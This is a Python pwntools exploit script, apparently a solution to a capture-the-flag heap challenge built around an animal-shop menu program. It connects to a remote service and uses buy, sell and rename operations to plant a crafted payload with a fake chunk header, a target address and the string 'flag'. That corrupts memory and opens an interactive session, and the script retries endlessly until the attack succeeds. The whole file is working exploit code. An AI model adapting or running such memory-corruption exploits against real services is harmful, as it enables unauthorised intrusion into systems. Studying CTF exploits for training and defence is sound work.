#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("oop_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("193.57.159.27",25046)

def s(data):
    r.sendlineafter("> ", data)

def buy_animal(type_, name):
    s("3")
    s(str(type_))
    r.sendlineafter("? ", name)

def rename(index, new_name):
    s("2")
    r.sendlineafter("? ", str(index))
    s("3")
    r.sendlineafter("? ", new_name)

def sell(index):
    s("2")
    r.sendlineafter("? ", str(index))
    s("1")


def main():
    buy_animal(1, "PIG0")
    buy_animal(1, "PIG1")
    
    sell(0) 
    
    payload = b"MMMM" + p64(0)*2
    payload += p64(0) + p64(0x41)
    payload += p64(0x404d78) + b"flag".ljust(8, p8(0))
    payload += p64(0) + p32(0x01000500)
    
    buy_animal(1, payload)
    
    sell(1)

    r.recvuntil("Your current balance is ")
    balance = int(r.recvline().strip())
    if balance < 1250:
        raise NameError("balance is low")

    print("Balance is ",  str(balance))
    s("4")
    
    buy_animal(1, "PIG2")
    rename(0, payload)
    s("2")
    r.sendlineafter("? ", "1")
    s("4")
    r.interactive()


if __name__ == "__main__":
    while True:
        try:
            main()
        except:
            pass
